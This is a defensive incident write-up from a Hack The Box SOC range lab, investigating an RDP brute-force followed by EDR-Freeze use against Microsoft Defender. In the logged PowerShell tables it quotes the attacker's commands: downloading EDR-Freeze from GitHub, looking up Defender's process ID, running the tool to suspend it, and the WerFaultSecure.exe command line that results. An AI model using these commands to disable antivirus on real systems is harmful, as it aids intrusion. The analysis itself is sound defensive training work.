---
tags:
  - htb
  - socrange
urls: https://enterprise.hackthebox.com/soc-range/alert/322
---
---

## Alert properties
Alert dispatched: Fri 26 Sep 25, 17:26

|**Field**|**Value**|
|---|---|
|**L1 Note**|When I investigated the alarm, I noted RDP brute-force activity prior to successful logon. Shortly after, the attacker executed reconnaissance commands via PowerShell. The hash appears malicious on VirusTotal. Assigning the alert for further investigation.|
|**Hostname**|WS-Prod-02|
|**IP Address**|172.16.20.69|
|**SHA256 Hash**|`970c7834e58b6ef22473875167a333dbb33bf7b667d1cb814829f68579cd85f7`|
|**Command Line**|`"C:\Users\LetsDefend\Downloads\EDR-Freeze_1.0.exe" 6080 10000`|
|**Process Name**|`EDR-Freeze_1.0.exe`|
|**Process Path**|`C:\Users\LetsDefend\Downloads\`|
|**Device Action**|Allowed|
|**Parent Process**|`powershell.exe`|
|**Trigger Reason**|Execution of known EDR tampering tool (EDR-Freeze) after suspicious PowerShell activity|

## Investigation

The alert raised by the L1 analyst points out RDP bruteforce and the usage of the malicious tool [EDR-Freeze](https://github.com/TwoSevenOneT/EDR-Freeze), used to temporary halt EDRs and antiviruses by abusing WerFaultSecure.exe.

Five RDP connections originating from IP 212.8.243.56 were logged under the event ID `131 The server accepted a new TCP connection from client`, this event ID logs any incoming connection, independently if authentication succeeds or fails.

| **Time Created** | **Event ID** | **Process ID** | **Computer**    | **Remote Host (IP:Port)** |
| ---------------- | :----------: | :------------: | --------------- | ------------------------- |
| 9/26/25 12:59    |     131      |      1328      | EC2AMAZ-ILGVOIN | `212.8.243.56:16122`      |
| 9/26/25 12:59    |     131      |      1328      | EC2AMAZ-ILGVOIN | `212.8.243.56:29443`      |
| 9/26/25 12:59    |     131      |      1328      | EC2AMAZ-ILGVOIN | `212.8.243.56:60630`      |
| 9/26/25 13:00    |     131      |      1328      | EC2AMAZ-ILGVOIN | `212.8.243.56:30521`      |
| 9/26/25 13:00    |     131      |      1328      | EC2AMAZ-ILGVOIN | `212.8.243.56:16171`      |

The IP 212.8.243.56 is marked as benign in [VirusTotal](https://www.virustotal.com/gui/ip-address/212.8.243.56):

![](images/SOC344%20-%20EDR%20Tampering%20Attempt%20via%20EDR-Freeze-2.png)

The community in [AbuseIPDB](https://www.abuseipdb.com/check/212.8.243.56) reports the IP as involved in brute-force attacks and others:

![](images/SOC344%20-%20EDR%20Tampering%20Attempt%20via%20EDR-Freeze-3.png)

Event ID 4625, which logs failed authentication events, shows four failed login attempts against the `admin` and `letsdefend` accounts. Logon type 3 confirms these authentication attempts came from the RDP bruteforce:

|**Time Created**|**Event ID**|**Process ID**|**Computer**|**Remote Host**|**Target Account**|**Logon Type**|
|---|:-:|:-:|---|---|---|:-:|
|9/26/25 12:59|4625|108|EC2AMAZ-ILGVOIN|BS-X9LD7Q3K-ZF8 (212.8.243.56)|`BS-X9LD7Q3K-ZF8\admin`|3|
|9/26/25 12:59|4625|108|EC2AMAZ-ILGVOIN|BS-X9LD7Q3K-ZF8 (212.8.243.56)|`BS-X9LD7Q3K-ZF8\admin`|3|
|9/26/25 12:59|4625|108|EC2AMAZ-ILGVOIN|BS-X9LD7Q3K-ZF8 (212.8.243.56)|`BS-X9LD7Q3K-ZF8\admin`|3|
|9/26/25 13:00|4625|108|EC2AMAZ-ILGVOIN|BS-X9LD7Q3K-ZF8 (212.8.243.56)|`BS-X9LD7Q3K-ZF8\letsdefend`|3|

The last RDP brute-force attempt gave the attacker access to the `letsdefend` account, as seen in event ID 4624, tasked with logging successful authentication events. Logon type 3 confirms this successful authentication came from the RDP bruteforce.

| **Time Created** | **Event ID** | **Process ID** | **Computer**    | **Remote Host**                | **Target Account**           | **Logon Type** |
| ---------------- | :----------: | :------------: | :-------------- | ------------------------------ | ---------------------------- | :------------: |
| 9/26/25 13:00    |     4624     |      108       | EC2AMAZ-ILGVOIN | BS-X9LD7Q3K-ZF8 (212.8.243.56) | `EC2AMAZ-ILGVOIN\LetsDefend` |       3        |

The SID `S-1-5-21-3163960855-2866672989-1813526453-1008` belonging to the user LetsDefend was changed to the actual user LetsDefend for report readability in the report.:
![](images/SOC344%20-%20EDR%20Tampering%20Attempt%20via%20EDR-Freeze.png)

Following successful authentication, basic enumeration commands were executed on the system, identified by PowerShell logging event ID 4104:

| **Time Created** | **User ID** | **PowerShell Command (ScriptBlockText)**                                                                                                                                 |
| ---------------- | ----------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 9/26/25 13:00    | LetsDefend  | `whoami`                                                                                                                                                                 |
| 9/26/25 13:00    | LetsDefend  | `systeminfo` 

Next, the malicious tool EDR-Freeze was downloaded from GitHub to the users' Downloads folder and unzipped:

| **Time Created** | **User ID** | **PowerShell Command (ScriptBlockText)**                                                                                                                                 |
| ---------------- | ----------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 9/26/25 13:01    | LetsDefend  | `Invoke-WebRequest -Uri 'https://github.com/TwoSevenOneT/EDR-Freeze/releases/download/main/EDR-Freeze_1.0.zip' -OutFile "$env:USERPROFILE\Downloads\EDR-Freeze_1.0.zip"` |
| 9/26/25 13:01    | LetsDefend  | `cd $env:USERPROFILE\Downloads`                                                                                                                                          |
| 9/26/25 13:02    | LetsDefend  | `Expand-Archive -Path "$env:USERPROFILE\Downloads\EDR-Freeze_1.0.zip" -DestinationPath "$env:USERPROFILE\Downloads" -Force`                                              |

The malicious file and zip file are still present in the machine:
![](images/SOC344%20-%20EDR%20Tampering%20Attempt%20via%20EDR-Freeze-1.png)


At 13:02, a PowerShell command was executed to obtain the Process ID from the Microsoft Defender antivirus, one minute later the PID was used as the first argument in the malicious tool to suspend the AV for 10000 milliseconds:

| **Time Created** | **User ID** | **PowerShell Command (ScriptBlockText)**                                                                                                                                 |
| ---------------- | ----------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 9/26/25 13:02    | LetsDefend  | `Get-Process -Name MsMpEng \| Select-Object Id, ProcessName`                                                                                                             |
| 9/26/25 13:03    | LetsDefend  | `.\EDR-Freeze_1.0.exe 6080 10000`   

Sysmon event ID 1 provided context of the following execution of WerFaultSecure.exe:

| **Time Created** | **User**                     | **Parent Command Line**                                         | **Executable / Command Line**                                                                         |
| ---------------- | ---------------------------- | --------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------- |
| 9/26/25 13:03    | `EC2AMAZ-ILGVOIN\LetsDefend` | `"C:\Users\LetsDefend\Downloads\EDR-Freeze_1.0.exe" 6080 10000` | `C:\Windows\System32\WerFaultSecure.exe /h /pid 6080 /tid 6076 /encfile 236 /cancel 300 /type 268310` |



## IOCs

| Type               | Value                            |
| ------------------ | -------------------------------- |
| IP                 | 212.8.243.56                     |
| EDR-Freeze_1.0.zip | 958A9694B6728389A85567E2F0CC1AF0 |
| EDR-Freeze_1.0.exe | 2C8FBD0F7FD0ED8EBCACB087C8FAA6F3 |


## Remediation
1. Delete the malicious files.
2. Change the credentials of the letsdefend user.
3. Close RDP, if it must be enabled, harden it.

## Conclusion

Gathered evidence concludes the attacker successfully obtained access via RDP thanks to brute-forcing the letsdefend user, once inside the attacker ran basic enumeration commands before downloading the malicious EDR-Freeze tool intended to stop Microsoft Defender. 


## Useful links

- [Administrative tools and logon types reference - Windows Server \| Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types)
- [How to Convert SID to User/Group Name and User to SID \| Windows OS Hub](https://woshub.com/convert-sid-to-username-and-vice-versa/)
- [Expand-Archive (Microsoft.PowerShell.Archive) - PowerShell \| Microsoft Learn](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.archive/expand-archive?view=powershell-7.6)
